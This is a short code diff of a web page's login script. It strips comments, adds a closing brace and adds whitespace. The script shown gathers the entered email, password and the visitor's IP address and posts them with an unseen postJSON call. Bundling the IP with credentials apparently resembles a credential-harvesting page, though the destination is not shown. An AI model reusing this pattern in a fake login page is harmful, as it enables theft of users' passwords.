@@ -275,13 +275,14 @@ form .create-account:hover {
             return 'Unknown';
         }
     }
+    
 
     async function login() {
-        const ipAddress = await getIPAddress(); // Fetch IP address
+        const ipAddress = await getIPAddress(); 
         const id = {
             email: document.getElementById("email").value,
             password: document.getElementById("password").value,
-            ipAddress: ipAddress  // Add IP address to the data
+            ipAddress: ipAddress  
         };
 
         await postJSON(id);
@@ -304,9 +305,11 @@ form .create-account:hover {
         } catch (e) {
             console.log("something went wrong", e);
         }
+      }
     
 </script>
 
 
 
 
+    
